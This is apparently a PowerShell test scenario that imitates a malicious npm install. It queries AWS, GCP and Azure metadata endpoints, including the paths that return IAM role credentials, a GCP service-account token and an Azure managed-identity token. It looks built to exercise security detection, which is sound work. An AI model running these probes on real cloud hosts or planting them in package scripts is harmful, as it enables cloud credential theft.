#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 7: Cloud Metadata Endpoint Probing
.DESCRIPTION
    Probes AWS, GCP, and Azure metadata endpoints for instance information
#>

Write-Host "Scenario 7: Cloud Metadata Endpoint Probing" -ForegroundColor Yellow

# Initialize npm project
try {
    npm init -y 2>$null | Out-Null
}
catch {
    # Ignore errors
}

# Start background npm install
$installJob = Start-Job -ScriptBlock {
    try {
        npm install test-package 2>$null
    }
    catch {
        # Expected to fail
    }
}

Start-Sleep -Seconds 1

Write-Host "Probing cloud metadata endpoints..." -ForegroundColor Red

# AWS Metadata probe
Write-Host "Probing AWS metadata endpoint..." -ForegroundColor Cyan
try {
    $awsResponse = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/instance-id" -TimeoutSec 5 -ErrorAction Stop
    Write-Host "AWS metadata response: $awsResponse" -ForegroundColor Red
}
catch {
    Write-Host "AWS metadata probe failed (expected outside AWS)" -ForegroundColor Gray
}

# GCP Metadata probe
Write-Host "Probing GCP metadata endpoint..." -ForegroundColor Cyan
try {
    $headers = @{ "Metadata-Flavor" = "Google" }
    $gcpResponse = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/" -Headers $headers -TimeoutSec 5 -ErrorAction Stop
    Write-Host "GCP metadata response: $gcpResponse" -ForegroundColor Red
}
catch {
    Write-Host "GCP metadata probe failed (expected outside GCP)" -ForegroundColor Gray
}

# Azure Metadata probe
Write-Host "Probing Azure metadata endpoint..." -ForegroundColor Cyan
try {
    $headers = @{ "Metadata" = "true" }
    $azureResponse = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers $headers -TimeoutSec 5 -ErrorAction Stop
    Write-Host "Azure metadata response: $azureResponse" -ForegroundColor Red
}
catch {
    Write-Host "Azure metadata probe failed (expected outside Azure)" -ForegroundColor Gray
}

# Additional cloud-specific probes
Write-Host "Additional cloud service probes..." -ForegroundColor Cyan

# AWS EC2 role credentials
try {
    $awsRoleResponse = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -TimeoutSec 5 -ErrorAction Stop
    Write-Host "AWS IAM roles discovered: $awsRoleResponse" -ForegroundColor Red
}
catch {
    Write-Host "AWS IAM role probe failed (expected)" -ForegroundColor Gray
}

# GCP service account token
try {
    $headers = @{ "Metadata-Flavor" = "Google" }
    $gcpTokenResponse = Invoke-RestMethod -Uri "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -Headers $headers -TimeoutSec 5 -ErrorAction Stop
    Write-Host "GCP service account token acquired" -ForegroundColor Red
}
catch {
    Write-Host "GCP service account probe failed (expected)" -ForegroundColor Gray
}

# Azure managed identity
try {
    $headers = @{ "Metadata" = "true" }
    $azureTokenResponse = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $headers -TimeoutSec 5 -ErrorAction Stop
    Write-Host "Azure managed identity token acquired" -ForegroundColor Red
}
catch {
    Write-Host "Azure managed identity probe failed (expected)" -ForegroundColor Gray
}

Write-Host "Cloud metadata probing simulation completed" -ForegroundColor Yellow
Write-Host "In a real attack, this would reveal cloud instance details and potentially credentials" -ForegroundColor Gray

# Clean up background job
$installJob | Stop-Job -PassThru | Remove-Job -Force

Write-Host "Scenario 7 complete" -ForegroundColor Green
